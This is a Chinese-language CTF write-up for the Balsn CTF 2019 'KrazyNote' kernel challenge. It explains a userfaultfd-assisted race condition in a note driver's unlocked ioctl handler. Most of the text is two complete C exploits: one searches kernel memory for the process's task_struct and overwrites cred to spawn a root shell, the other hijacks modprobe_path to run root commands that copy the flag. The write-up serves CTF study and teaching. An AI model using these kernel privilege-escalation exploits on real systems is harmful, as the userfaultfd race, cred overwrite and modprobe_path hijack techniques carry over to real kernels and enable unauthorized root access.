# 2019_balsnctf

标签（空格分隔）： pwn

---

## KrazyNote

### 前置学习

#### 权限注入
大部分的`rcS`启动文件都会有被命令注入提高权限问题，一般认为打包命令是有很大一部分责任。本题原本的文件系统是安全的，被我解包再打包后就不安全了。

    find . | cpio -o --format=newc > ../initramfs.cpio

![image_1e6vc3qeosuh1tkeaqecqosh79.png-84.7kB][1]

如何解决它？本想在`rcS`里多加命令来限制权限，但不知道是不是因为软链接的问题，导致要么程序无法正常`getshell`，要么限制失效。该问题可能还是得从打包方式解决。

#### userfaulted阻塞
`userfaultfd`机制可以让用户来处理缺页，可以在用户空间定义自己的`page fault handler`。用法请参考[官方文档][2]。

`userfaultfd` 本质上是利用缺页处理，加大了阻塞主进程的时间，可以让**竞态窗口**开的更大。
另外，如在执行到`copy_from_user()`时,**有锁防止**访存错误被挂起，这种利用就会失败。

#### 内存映射
[相关文档][3]

![image_1e74h0mpf1bg212tn127elp21oi79.png-208.3kB][4]
从`0xffff888000000000-0xffffc87fffffffff`该区域是直接映射区域，也被称作为`page_offset_base`。`task_struct`，`cred`等结构体也会首先分配在该区域。

### 解题思路
首先查看note.ko驱动的反编译结果。
在初始化时，使用`misc_register()`函数来注册驱动。
![image_1e74kpa7214ihl034sbvmmju2m.png-13.7kB][5]

虽然驱动删去了符号表，无法查看结构具体情况，但通过检索网络获得`dev`的结构细节。
```C
struct miscdevice {
        int                        minor;                /*     0     4 */


        const char  *              name;                 /*     8     8 */
        const struct file_operations  * fops;            /*    16     8 */
        struct list_head           list;                 /*    24    16 */
        struct device *            parent;               /*    40     8 */
        struct device *            this_device;          /*    48     8 */
        const struct attribute_group  * * groups;        /*    56     8 */
        /* --- cacheline 1 boundary (64 bytes) --- */
        const char  *              nodename;             /*    64     8 */
        umode_t                    mode;                 /*    72     2 */
};
```
![image_1e74l6njtui02tq1se5hu115n13.png-38.6kB][6]

主要查看其中的结构成员`fops`，具体实现了哪些驱动函数。
![image_1e74lag3a1elaaqbjsl1uve1c4l1g.png-10.4kB][7]
![image_1e723q42t1v6m11101iqe6ib1h99.png-137.8kB][8]

通过地址偏移和对结构体成员的偏移计算，得出了`unlocked_ioctl()`和`open()`函数，主要信息还是查看`unlocked_ioctl()`函数中。
`unlocked_ioctl()`和`compat_ioctl()`函数的区别在于，`unlocked_ioctl()`不使用内核提供的全局同步锁，所有的同步原语需自己实现，所以可能存在条件竞争漏洞，为提权时使用`userfaulted`创造条件。当然，牺牲内核大锁可以换来速度的优化，只是要考验程序员的功底。

![image_1e74m8uic1hogjnn1bn584d1elj1t.png-44.8kB][9]
设备实现了增删查改四个功能基本菜单题，和两个结构体进行辅助。

![image_1e74mcknt1g6b1ovg1hh91o6013rh2a.png-51.2kB][10]
在梳理流程时，还有一个问题，其中的`page_offset_base`代表什么值。关闭启动脚本的内核随机化参数后，利用`gdb`调试查看该值，即是内核内存直接映射区域的起始地址`0xffff888000000000`。

考虑一下情况，
|thread 1                    |thread 2|
| :-----:                    | :----: |
|new note_0 (size 0x10)        |idle  |
|create userfaulted            |idle  |
|edit note_0 (size 0x10)	   |poll  |
|idle	                       |delete|
|idle	        |add note_0 (size 0x0)|
|idle	        |add note 1 (size 0x0)|
|continue edit note_0 (size 0x10)|idle|

同时，使用`gdb`查看了如果申请0字节时，内存的分配情况。
![image_1e723s8sq1uquem47b01rraage13.png-31.4kB][11]

可以看出，由于`edit()`时`copy_from_user()`首次访问`mmap`地址，触发缺页处理函数。等`thread 2`删除所有`note`并重新添加两个空字节的`note`后，`thread 1`才继续编辑`note_0`，此时的编辑`content`，而`size`还是`0x10`，所以就会产生溢出。
需要再次强调的是，处理用户空间的页错误(`userfaultfd`)可以顺利运行是因为，本题使用了`unlocked_ioctl()`函数，对全局数组`notes`进行访问时没有上锁，所以才能用在`copy_from_user()`处暂停，并且中断去访问修改数组。

![image_1e74o110e1ord1ri11and10b214p19.png-23.7kB][12]
现在，你已经差不多拥有了任意地址读写的能力，不过受到`LOBYTE()`函数影响，最多一次读写只能`0xff`个字节。

利用步骤：
（1）泄露`key`：输出`note_1`的`content`，内容会与key异或后输出，由于为 0 ，结果为`key`。

（2）泄露`page_offset`：创建`note_2`，再次输出`note_1`的`content+0x10`，与`key`异或得到为`note_2`的`conPtr`，即可计算出`page_offset`。

（3）获取`page_offset_base`：因为`conPtr`偏移是从`page_offset_base`开始，而驱动地址随机化只修改了中间三位，所以完全可以凭借`page_offset`来计算得到`module_base`，进一步得到`page_offset_base`。
当然，也可以利用将`note_2`的`conPtr`改成`module_base+0x1fa`，
然后泄露`page_offset_base`在驱动中的偏移`page_offset_base_offset`；再将`note_2`的`conPtr`改成`module_base+0x1fe+page_offset_base_offset`，泄露出`page_offset_base`。
```C
.text:00000000000001F7      mov r12, cs:page_offset_base
.text:000000000000006C      call    _copy_from_user
```
（4）搜索`cred`地址：其实直接地址覆盖为0开始搜索，因为`conPtr`偏移就是从`page_offset_base`开始。利用`prctl`的`PR_SET_NAME`功能搜索到`task_struct`结构，满足条件：`real_cred`(`&comm[]`-0x10处)和`cred`(`&comm[]`-0x8处)指针值相等且位于内核空间(即大于`0xffff000000000000`)。

（5）修改cred提权。`real_cred`指向的就是`cred`结构体的地址。将`note_2`的`conPtr`覆盖为`cred_addr - page_offset_base + 4`的位置。要充填前`32`位（第一个成员不用管）。
![image_1e74ol42u1ulssg7t3bpqo1ni4m.png-41.2kB][13]

`gdb`查找字符串来在调试时，确定位置

    find start_address, end_address, "xxxxx"

### exp_cred
```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <unistd.h>
#include <assert.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/prctl.h>

struct noteReq{
    unsigned long index;
    unsigned long length;
    void* userptr;
};

int fd;

void add(void *ptr, int length){
    struct noteReq req;
    req.length = length;
    req.userptr = ptr;
    if(ioctl(fd, 0xFFFFFF00, &req) < 0){
        perror("add");
    }
}

void delete(){
    struct noteReq req;
    if(ioctl(fd, 0xFFFFFF03, &req) < 0){
        perror("delete");
    }
}

void edit(int index, void *ptr, int length){
    struct noteReq req;
    req.index = index;
    req.length = length;
    req.userptr = ptr;
    if(ioctl(fd, 0xFFFFFF01, &req) < 0){
        perror("edit");
    }
}

void show(int index, void *ptr){
    struct noteReq req;
    req.index = index;
    req.userptr = ptr;
    if(ioctl(fd, 0xFFFFFF02, &req) < 0){
        perror("show");
    }
}

#define page_size 0x1000
#define FAULT_ADDR (void*)0xdead000
char buffer[0x1000]; //cover all the relative address

static void* fault_handler_thread(void *arg){    
    static struct uffd_msg msg;

    unsigned long uffd = (unsigned long) arg;
    puts("Fault_handler beginning");

    //while(1) {
        struct pollfd pollfd;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        if (poll(&pollfd, 1, -1) == -1)
            perror("poll");
        
        puts("Trigger poll");
        //opt
        delete();
        memset(buffer, 0, sizeof(buffer));
        add(buffer, 0);
        add(buffer, 0);
        buffer[8] = 0xf0; //ninth byte
        //

        read(uffd, &msg, sizeof(msg));
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        
        struct uffdio_copy uffdio_copy;

        uffdio_copy.src = (unsigned long) buffer;
        uffdio_copy.dst = (unsigned long) FAULT_ADDR;
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) < 0)
            perror("uffdio_copy");
    //}
    puts("Userfaulted end");
}

void register_userfault(){
    unsigned long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    pthread_t tid;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api) < 0)
        perror("uffdio_api");

    if(mmap(FAULT_ADDR, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != FAULT_ADDR)
        perror("mmap fault page");

    uffdio_register.range.start = (unsigned long) FAULT_ADDR;
    uffdio_register.range.len = page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) < 0)
        perror("uffdio_register");

    if(pthread_create(&tid, NULL, fault_handler_thread, (void*)uffd) < 0)
        perror("pthread");
}

char bufptr[0x100]={0};

int main() {
    fd = open("/dev/note", 0);
    if (fd < 0){
        perror("open");
    }
    
    add(bufptr, 0x10);
    register_userfault();
    edit(0, FAULT_ADDR, 0x10); //suspend
    
    show(1, bufptr);   //0->key
    unsigned long key = *(unsigned long *)bufptr;
    
    add(bufptr, 0); //2
    show(1, bufptr);    
    unsigned long content_key = *(unsigned long*)(bufptr+0x10) ^ key;
    unsigned long module_key = content_key - 0x2500 - 0x68;
    unsigned long page_offset_base = 0xffffffffc0000000 + (module_key&0xffffff) - module_key;
    printf("key: 0x%lx; module_key: 0x%lx; page_offset_base: 0x%lx\n", key, module_key, page_offset_base);

    if(prctl(PR_SET_NAME, "leafishexp") < 0)
        perror("prctl");
    unsigned long* find;
    unsigned long offset = 0;
    while(1){
        *(unsigned long *)bufptr = key ^ 0;
        *(unsigned long *)(bufptr + 0x8) = key ^ 0xff;
        *(unsigned long *)(bufptr + 0x10) = key ^ offset;
        edit(1, bufptr, 0x18);
        memset(bufptr, 0, 0x100);
        show(2, bufptr);
        find = (unsigned long *)memmem(bufptr, 0x100, "leafishexp", 10);
        if(find){
            printf("found offset: %p\n", find);
            if(find[-1]==find[-2] && find[-1]>0xffff000000000000)
                break;
        }
        offset += 0x100;
    }

    *(unsigned long *)bufptr = key ^ 0;
    *(unsigned long *)(bufptr + 0x8) = key ^ 0x28;
    *(unsigned long *)(bufptr + 0x10) = key ^ (find[-2] + 4 - page_offset_base);
    edit(1, bufptr, 0x18);

    memset(bufptr, 0, 0x28);
    edit(2, bufptr, 0x28);

    puts("get shell");
    system("/bin/sh");
    return 0;
}
```

### exp_modprobe
当然，这样搜索太慢，也可以在第三步时，同时泄露`_copy_from_user`的地址来得到`kernel_base`，劫持`modprobe_path`，快速得到`flag`。需要注意，泄露得到的是地址偏移，需要再次计算。`modprobe_path`可以用来执行`root`权限命令，但直接**提权getshell**不行。


```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <unistd.h>
#include <assert.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/prctl.h>


struct noteReq{
    unsigned long index;
    unsigned long length;
    void* userptr;
};

int fd;

void add(void *ptr, int length){
    struct noteReq req;
    req.length = length;
    req.userptr = ptr;
    if(ioctl(fd, 0xFFFFFF00, &req) < 0){
        perror("add");
    }
}

void delete(){
    struct noteReq req;
    if(ioctl(fd, 0xFFFFFF03, &req) < 0){
        perror("delete");
    }
}

void edit(int index, void *ptr, int length){
    struct noteReq req;
    req.index = index;
    req.length = length;
    req.userptr = ptr;
    if(ioctl(fd, 0xFFFFFF01, &req) < 0){
        perror("edit");
    }
}

void show(int index, void *ptr){
    struct noteReq req;
    req.index = index;
    req.userptr = ptr;
    if(ioctl(fd, 0xFFFFFF02, &req) < 0){
        perror("show");
    }
}

#define page_size 0x1000
#define FAULT_ADDR (void*)0xdead000
char buffer[0x1000]; //cover all the relative address

static void* fault_handler_thread(void *arg){    
    static struct uffd_msg msg;

    unsigned long uffd = (unsigned long) arg;
    puts("Fault_handler beginning");

    //while(1) {
        struct pollfd pollfd;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        if (poll(&pollfd, 1, -1) == -1)
            perror("poll");
        
        puts("Trigger poll");
        //opt
        delete();
        memset(buffer, 0, sizeof(buffer));
        add(buffer, 0);
        add(buffer, 0);
        buffer[8] = 0xf0; //ninth byte
        //

        read(uffd, &msg, sizeof(msg));
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        
        struct uffdio_copy uffdio_copy;

        uffdio_copy.src = (unsigned long) buffer;
        uffdio_copy.dst = (unsigned long) FAULT_ADDR;
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) < 0)
            perror("uffdio_copy");
    //}
    puts("Userfaulted end");
}

void register_userfault(){
    unsigned long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    pthread_t tid;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api) < 0)
        perror("uffdio_api");

    if(mmap(FAULT_ADDR, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != FAULT_ADDR)
        perror("mmap fault page");

    uffdio_register.range.start = (unsigned long) FAULT_ADDR;
    uffdio_register.range.len = page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) < 0)
        perror("uffdio_register");

    if(pthread_create(&tid, NULL, fault_handler_thread, (void*)uffd) < 0)
        perror("pthread");
}

void modprobe(){
    system("echo -ne '#!/bin/sh\n /bin/cp /flag /home/note/flag\n /bin/chmod 777 /home/note/flag' > /home/note/flag.sh");
    system("chmod +x /home/note/flag.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/note/dummy");
	system("chmod +x /home/note/dummy");
    system("/home/note/dummy");
    system("cat flag");
}

char bufptr[0x100]={0};

int main() {
    fd = open("/dev/note", 0);
    if (fd < 0){
        perror("open");
    }
    
    add(bufptr, 0x10);
    register_userfault();
    edit(0, FAULT_ADDR, 0x10); //suspend
    
    show(1, bufptr);   //0->key
    unsigned long key = *(unsigned long *)bufptr;
    
    add(bufptr, 0); //2
    show(1, bufptr);    
    unsigned long content_key = *(unsigned long*)(bufptr+0x10) ^ key;
    unsigned long module_key = content_key - 0x2500 - 0x68;
    unsigned long page_offset_base = 0xffffffffc0000000 + (module_key&0xffffff) - module_key;
    printf("key: 0x%lx; module_key: 0x%lx; page_offset_base: 0x%lx\n", key, module_key, page_offset_base);

    unsigned long module_base = 0xffffffffc0000000 + (module_key & 0xffffff);
    printf("module_base: 0x%lx\n", module_base);
    *(unsigned long *)bufptr = key ^ 0;
    *(unsigned long *)(bufptr + 0x8) = key ^ 0x4;
    *(unsigned long *)(bufptr + 0x10) = key ^ (module_base+0x6c+0x1-page_offset_base);
    edit(1, bufptr, 0x18);
    
    show(2, bufptr);
    int _copy_from_user_offset = *(int *)bufptr;
    unsigned long _copy_from_user = module_base + 0x6c + 0x1 + 0x4 + _copy_from_user_offset;
    unsigned long modprobe_path = _copy_from_user+0xffffffff8205e0e0-0xfffffffF81353e80;
    printf("_copy_from_user: 0x%lx; modprobe_path: 0x%lx\n", _copy_from_user, modprobe_path);
    
    char buf[0x28];
    memset(buf, 0, 0x28);
    strcpy(buf, "/home/note/flag.sh\x00");
    *(unsigned long *)bufptr = key ^ 0;
    *(unsigned long *)(bufptr + 0x8) = key ^ 0x20;
    *(unsigned long *)(bufptr + 0x10) = key ^ (modprobe_path - page_offset_base);
    edit(1, bufptr, 0x18);
    edit(2, buf, 0x20);

    modprobe();
    return 0;
}
```

![image_1e734paevjjo17fleaa1a15th9.png-43.1kB][14]

### 补充
*文件过大问题*
利用`uclibc`来编译二进制文件，环境配置比较麻烦，可直接下载一个配置好的[系统][15]。


  [1]: http://static.zybuluo.com/leafish/e86u5q8x5yciwck2de1bpi4q/image_1e6vc3qeosuh1tkeaqecqosh79.png
  [2]: http://man7.org/linux/man-pages/man2/userfaultfd.2.html
  [3]: https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
  [4]: http://static.zybuluo.com/leafish/y4b9btjir01tm161n29xeaw7/image_1e74h0mpf1bg212tn127elp21oi79.png
  [5]: http://static.zybuluo.com/leafish/cpemi1wafhu00b1sgrgtickb/image_1e74kpa7214ihl034sbvmmju2m.png
  [6]: http://static.zybuluo.com/leafish/4jxy2lfb4vcwekjo4j6ay9c3/image_1e74l6njtui02tq1se5hu115n13.png
  [7]: http://static.zybuluo.com/leafish/mc8fxo1pdyzrc1tgm8fk8rx3/image_1e74lag3a1elaaqbjsl1uve1c4l1g.png
  [8]: http://static.zybuluo.com/leafish/v5a7njxc1x4y7vf01upmzxaf/image_1e723q42t1v6m11101iqe6ib1h99.png
  [9]: http://static.zybuluo.com/leafish/jpg13had1tbi8xazvmx38lrc/image_1e74m8uic1hogjnn1bn584d1elj1t.png
  [10]: http://static.zybuluo.com/leafish/n9e5u2jhki8fuz8jf7vkkfac/image_1e74mcknt1g6b1ovg1hh91o6013rh2a.png
  [11]: http://static.zybuluo.com/leafish/70qsg2p46qj6csuvlor1v32w/image_1e723s8sq1uquem47b01rraage13.png
  [12]: http://static.zybuluo.com/leafish/jkq0cfvbkyszp9aj615tv6gy/image_1e74o110e1ord1ri11and10b214p19.png
  [13]: http://static.zybuluo.com/leafish/q6dpxzvrp8dff8msv9alxarl/image_1e74ol42u1ulssg7t3bpqo1ni4m.png
  [14]: http://static.zybuluo.com/leafish/vm6mq7m7b1qbdq5r84aj1p41/image_1e734paevjjo17fleaa1a15th9.png
  [15]: https://hub.docker.com/r/klee/uclibc